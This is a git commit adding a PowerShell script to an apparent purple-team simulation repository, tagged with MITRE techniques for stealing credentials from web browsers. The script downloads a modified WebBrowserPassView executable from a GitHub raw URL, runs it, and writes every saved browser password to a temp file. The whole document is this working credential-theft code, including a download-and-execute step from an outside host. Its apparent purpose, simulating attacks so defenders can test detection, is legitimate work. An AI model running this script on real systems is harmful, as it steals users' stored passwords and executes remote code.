ab037109acc82fc5132c6c95e9de94aff533c26e
mthcht <mathieuchotplassot@gmail.com>
2023-01-24 00:09:39 +0100

    Create get_passwords_from_browsers_with_WebBrowserPassView.ps1

---
+++ Simulation/Windows/System/get_passwords_from_browsers_with_WebBrowserPassView.ps1
@@ -0,0 +1,30 @@
+<#
+    T1588.002 - Obtain Capabilities: Tool
+    T1555.003 - Credentials from Password Stores: Credentials from Web Browsers
+    Extract passwords from browsers with Nirsoft tool WebBrowserPassView.exe
+    Download  WebBrowserPassView.exe from forked project https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/WebBrowserPassView.exe and execute it 
+#>
+
+# Download and execute WebBrowserPassView.exe (the binary on my repo is accepting commandline, the default available on Nirsoft site does not)
+$url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/WebBrowserPassView.exe"
+$dumpfile = "$env:windir\Temp\BrowserPass.txt"
+$outfile = "$env:tmp\BrowserPass.exe"
+try {
+    Invoke-WebRequest $url -OutFile $outfile 
+    if (Test-Path $outfile){
+        Write-Host -ForegroundColor Green "Success: WebBrowserPassView.exe downloaded to $outfile"
+        & $outfile /stext $dumpfile
+    }
+    else{
+        Write-Host -ForegroundColor Red "Error: Failed to download WebBrowserPassView.exe, $dumpfile not found."
+    }
+    if(test-path $dumpfile){
+        Write-Host -ForegroundColor Green "Success: Browser passwords extracted to $dumpfile"
+    }
+    else{
+        Write-Host -ForegroundColor Red "Error: Failed to extract Browser passwords to $dumpfile"
+    }
+}
+catch {
+    Write-Error $_
+}
